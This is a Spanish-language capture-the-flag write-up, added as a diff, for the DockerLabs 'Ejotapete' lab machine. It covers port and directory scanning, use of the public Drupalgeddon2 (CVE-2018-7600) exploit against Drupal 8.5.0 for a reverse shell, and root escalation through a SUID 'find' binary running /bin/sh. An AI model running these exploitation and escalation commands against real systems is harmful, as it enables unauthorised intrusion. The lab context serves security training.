@@ -1,0 +1,207 @@
+---
+title: Ejotapete
+description: Resolución completa de la máquina virtual *Ejotapete* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Ejotapete**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que ejecuta **Drupal 8.5.0**, una versión vulnerable a **CVE-2018-7600 (Drupalgeddon2)**. Esta vulnerabilidad permite ejecución remota de comandos sin autenticación, otorgando acceso inicial como `www-data`.
+Tras obtener acceso, se identifica que el binario `find` tiene permisos SUID, lo que permite ejecutar una shell con privilegios de `root` mediante la técnica de GTFOBins, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Ejotapete',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '14/07/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Ejotapete.zip
+sudo bash auto_deploy.sh Ejotapete.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Ejotapete/{content,exploits,nmap,scripts}
+cd Ejotapete
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761294149/Ports_feptyy.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1761294149/Gobuster_mrgwc0.png)
+
+**Ruta encontrada:**
+- `/drupal` — Instalación de Drupal.
+
+![Drupal](https://res.cloudinary.com/dewqswzke/image/upload/v1761294149/Drupal_cxauvo.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Identificación de vulnerabilidad
+
+Al acceder a la ruta `/drupal`, se confirma que se trata de **Drupal 8.5.0** (visible en el código fuente). Esta versión es vulnerable a ejecución remota de comandos (RCE).
+
+Se verifica el exploit correspondiente con **Searchsploit**:
+
+```bash
+searchsploit drupal 8.5.0
+```
+
+![Searchsploit](https://res.cloudinary.com/dewqswzke/image/upload/v1761294149/Searchsploit_xgev6a.png)
+
+El resultado muestra el exploit `Drupalgeddon2 (CVE-2018-7600)` que permite ejecución remota de código no autenticado.
+
+### 2.2 Ejecución del exploit
+
+Se descarga el exploit:
+
+```bash
+searchsploit -m 44449
+```
+
+Se instalan las dependencias requeridas (librería `highline` para Ruby):
+
+```bash
+gem install highline
+```
+
+Se ejecuta el exploit:
+
+```bash
+ruby 44449.rb http://172.17.0.2/drupal
+```
+
+El script explota la vulnerabilidad y concede una **reverse shell** como el usuario `www-data`.
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → root
+
+Con acceso como `www-data`, se enumeran binarios con permisos especiales (SUID):
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+El resultado revela que el binario `find` tiene el bit SUID activado:
+
+![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1761294149/Find_yhduwm.png)
+
+Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins para `find` con SUID:
+
+```bash
+searchbins -b find -f suid
+```
+
+Se ejecuta el siguiente comando para obtener una shell con privilegios de root:
+
+```bash
+find . -exec /bin/sh \; -quit
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761294149/Root_mjywhf.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Drupal 8.5.0 vulnerable a CVE-2018-7600 (Drupalgeddon2)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos sin autenticación"
+    },
+    {
+      vulnerability: "Falta de actualizaciones de seguridad en Drupal",
+      severity: "Crítica",
+      impact: "Compromiso total del sistema mediante RCE"
+    },
+    {
+      vulnerability: "Permiso SUID en binario find",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de segmentación de usuarios",
+      severity: "Alta",
+      impact: "Movimiento lateral y escalada de privilegios"
+    },
+    {
+      vulnerability: "Exposición de versión de software en código fuente",
+      severity: "Media",
+      impact: "Identificación de vectores de ataque conocidos"
+    }
+  ]}
+/>
